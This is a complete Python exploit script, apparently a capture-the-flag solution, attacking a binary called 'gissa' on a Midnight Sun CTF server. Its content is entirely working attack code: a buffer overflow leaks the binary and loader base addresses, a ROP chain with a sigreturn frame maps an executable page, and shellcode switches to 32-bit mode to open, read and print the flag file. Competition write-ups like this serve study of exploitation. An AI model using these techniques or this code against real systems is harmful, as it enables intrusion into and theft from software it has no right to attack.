#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './gissa'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file], 'aslr':False}, \
                        remote  = {'host':'pwn2.midnightsunctf.se', 'port':11101})
env.select()

#==========

binf = ELF(bin_file)

ld = ELF('ld-2.23.so')
offset_ld_dlstart   = 0xc38

addr_shellcode = 0x1000000

#==========

def attack(conn):
    conn.sendlineafter(': ', '')

    conn.sendlineafter(': ', 'a'*0x8c+p32(0xa8))
    conn.sendafter(': ', '\xff'*(0xa8-1)+'!')
    conn.recvuntil('!')
    binf.address = u(conn.recvuntil(' ', drop=True)) - 0xa05
    addr_rax        = binf.address + 0xa5d
    addr_syscall    = binf.address + 0xa19
    addr_stack      = binf.address + 0x202000
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))

    conn.sendlineafter(': ', 'a'*0x8c+p32(0xc0))
    conn.sendafter(': ', '\xff'*(0xc0-1)+'!')
    conn.recvuntil('!')
    addr_ld_dlstart = u(conn.recvuntil(' ', drop=True)) - 0x32
    ld.address = addr_ld_dlstart - offset_ld_dlstart
    addr_rdi        = ld.address + 0x00002112
    addr_rsi        = ld.address + 0x000106ca
    addr_rdx_rbx    = ld.address + 0x00000d5f
    info('addr_ld_base      = 0x{:08x}'.format(ld.address))

    frame = SigreturnFrame()
    frame.rax = constants.SYS_mmap
    frame.rdi = addr_shellcode
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.r10 = 0x22
    frame.r8  = -1
    frame.r9  = 0
    frame.rsp = addr_stack
    frame.rip = addr_syscall

    exploit  = 'a'*0xa8
    exploit += p64(addr_rax)
    exploit += p64(constants.SYS_read)
    exploit += p64(addr_rdi)
    exploit += p64(constants.STDIN_FILENO)
    exploit += p64(addr_rsi)
    exploit += p64(addr_stack)
    exploit += p64(addr_rdx_rbx)
    exploit += p64(0x100)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_syscall)

    exploit += p64(addr_rax)
    exploit += p64(0xf) # constants.SYS_sigreturn
    exploit += p64(addr_syscall)
    exploit += str(frame)
    conn.sendafter(': ', exploit)
    conn.sendlineafter(': ', '')

    exploit  = p64(addr_rax)
    exploit += p64(constants.SYS_read)
    exploit += p64(addr_rdi)
    exploit += p64(constants.STDIN_FILENO)
    exploit += p64(addr_rsi)
    exploit += p64(addr_shellcode)
    exploit += p64(addr_rdx_rbx)
    exploit += p64(0x1000)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_syscall)
    exploit += p64(addr_shellcode)
    sleep(0.1)
    conn.send(exploit)

    shellcode  = '''
        mov rsp, {}
        call a
    a:  mov dword ptr [rsp+4], 0x23
        add dword ptr [rsp], 0xd
        retf
    '''.format(addr_shellcode + 0x800)
    assembly = asm(shellcode)

    context(arch = 'x86', bits = 32)
    shellcode  = shellcraft.open('./flag', 0)
    shellcode += shellcraft.read(3, addr_shellcode + 0xc00, 0x100)
    shellcode += shellcraft.write(constants.STDOUT_FILENO, addr_shellcode + 0xc00, 0x100)
    assembly += asm(shellcode)
    sleep(0.1)
    conn.send(assembly)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
